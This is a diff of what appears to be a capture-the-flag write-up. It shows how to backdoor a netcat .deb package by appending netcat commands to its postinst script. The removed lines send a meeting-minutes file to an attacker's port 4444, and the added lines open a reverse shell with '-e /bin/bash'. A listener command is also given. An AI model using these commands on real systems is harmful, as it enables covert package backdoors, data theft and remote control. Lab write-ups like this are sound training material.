@@ -46,7 +46,6 @@ dpkg-deb -R netcat-traditional_1.10-41.1ubuntu1_amd64.deb tmp
 echo /bin/nc `ifconfig eth0 | grep 'inet ' | awk '{print $2}'`' 4444 < /NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt' >> tmp/DEBIAN/postinst
 mkdir -p ../pub/jfrost/backdoor
 dpkg-deb -b tmp ../pub/jfrost/backdoor/suriv_amd64.deb
-
 ```
 That way the remote device would download this package and install it. In course of the installation, the file in scope would be sent to port 4444 of the local host, which has to run the command
 
@@ -60,19 +59,18 @@ In this file it can be found that **Tanta Kringle** recused herself from the vot
 cd ~/debs
 mkdir tmp
 dpkg-deb -R netcat-traditional_1.10-41.1ubuntu1_amd64.deb tmp
-echo /bin/nc `ifconfig eth0 | grep 'inet ' | awk '{print $2}'`' 4444 < /NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt' >> tmp/DEBIAN/postinst
+echo /bin/nc `ifconfig eth0 | grep 'inet ' | awk '{print $2}'`' 4444 -e /bin/bash' >> tmp/DEBIAN/postinst
 mkdir -p ../pub/jfrost/backdoor
 dpkg-deb -b tmp ../pub/jfrost/backdoor/suriv_amd64.deb
-
 ```
-That way the remote device would download this package and install it. In course of the installation, the file in scope would be sent to port 4444 of the local host, which has to run the command
+That way the remote device would download this package and install it. In course of the installation, a reverse shell connection is established to the local host, which has to run the command
 
     nc -lvp 4444
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbLTIwOTcyOTQ2MDgsMTE5NTQ4OTUxMSw3OT
-czNDE5MjIsMjY4NjUzNDg0LDEyNzI2NTY0MTksODU4MTg4OTI5
-LDEwOTI3ODUzMjEsLTIwNjI2NzUyOTcsLTYxMjg5Nzc5OSwtOD
-UyNzIyNzAzLDE3NTgyNDM2NzcsMTYzNDM5NDk0MSwxMjA0NDI2
-NTM5LC0xNzk4NDE1ODk2LC04NzgzOTIyMTYsNTE0MjA5MTU5XX
-0=
+eyJoaXN0b3J5IjpbLTI4MTg5OTI3NiwxMTk1NDg5NTExLDc5Nz
+M0MTkyMiwyNjg2NTM0ODQsMTI3MjY1NjQxOSw4NTgxODg5Mjks
+MTA5Mjc4NTMyMSwtMjA2MjY3NTI5NywtNjEyODk3Nzk5LC04NT
+I3MjI3MDMsMTc1ODI0MzY3NywxNjM0Mzk0OTQxLDEyMDQ0MjY1
+MzksLTE3OTg0MTU4OTYsLTg3ODM5MjIxNiw1MTQyMDkxNTldfQ
+==
 -->
